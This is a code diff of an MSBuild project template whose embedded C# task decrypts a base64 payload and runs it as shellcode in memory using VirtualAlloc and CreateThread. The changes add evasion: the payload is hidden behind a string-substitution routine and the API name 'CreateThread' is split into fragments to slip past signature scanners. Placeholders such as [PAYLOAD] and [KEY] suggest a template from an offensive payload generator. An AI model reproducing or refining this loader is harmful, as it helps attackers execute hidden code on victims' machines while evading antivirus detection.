@@ -1,6 +1,3 @@
-<!--
-[PAYLOAD]
--->
 <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
   <Target Name="VAR1"[CONDITION]>
    <VAR1 />
@@ -51,20 +48,15 @@
 			[DllImport("kernel32.dll")]
 			public static extern IntPtr GetProcAddress(IntPtr VAR5, string VAR26);
 
-			public override bool Execute() {
-				string[] VAR3 = Environment.GetCommandLineArgs();
-			
-				StreamReader VAR6 = File.OpenText(VAR3[1]);
-				StringBuilder VAR7 = new StringBuilder();
-				string VAR8;
-				while((VAR8 = VAR6.ReadLine()) != null) {
-						if(String.Equals(VAR8, "-->")) {
+			public override bool Execute() {	
+							
 							byte[] VAR9 = {[KEY]};
-							byte[] VAR10 = Convert.FromBase64String(VAR7.ToString());
+							string VAR7 = VAR60.VAR61("[PAYLOAD]");
+							byte[] VAR10 = Convert.FromBase64String(VAR7);
 							byte[] VAR11 = VAR16.VAR28(VAR9, VAR10);
 
 							IntPtr VAR33 = LoadLibrary("kernel32.dll");
-                					IntPtr VAR34 = GetProcAddress(VAR33, "CreateThread");
+                					IntPtr VAR34 = GetProcAddress(VAR33, "Crea"+"t"+"eTh"+"read");
                						VAR32 VAR35 = (VAR32)Marshal.GetDelegateForFunctionPointer(VAR34, typeof(VAR32));
 						
 							UInt32 VAR42 = VirtualAlloc(0, (UInt32)VAR11.Length, VAR40, VAR41);
@@ -75,15 +67,19 @@
 							VAR43 = VAR35(IntPtr.Zero, 0, (IntPtr)VAR42, VAR44, 0, ref VAR45);
 							WaitForSingleObject(VAR43, 0xFFFFFFFF);
 							return true;
-						}
-						if(!String.Equals(VAR8, "<!--")) {
-							VAR7.AppendLine(VAR8);
-						}
 				}
 				return true;
 			}
 		}
 		
+		public class VAR60 {
+			public static string VAR61(string VAR62) {
+				string VAR63 = "[PATTERN_1]";
+				string VAR64 = "[PATTERN_2]";
+				return VAR62.Replace(VAR63, "m").Replace(VAR64, "V");
+			}
+		}
+
 		public class VAR16 {
 			public static byte[] VAR17(byte[] VAR18, byte[] VAR19) {
 				int VAR20, VAR21, VAR22, VAR23, VAR24;
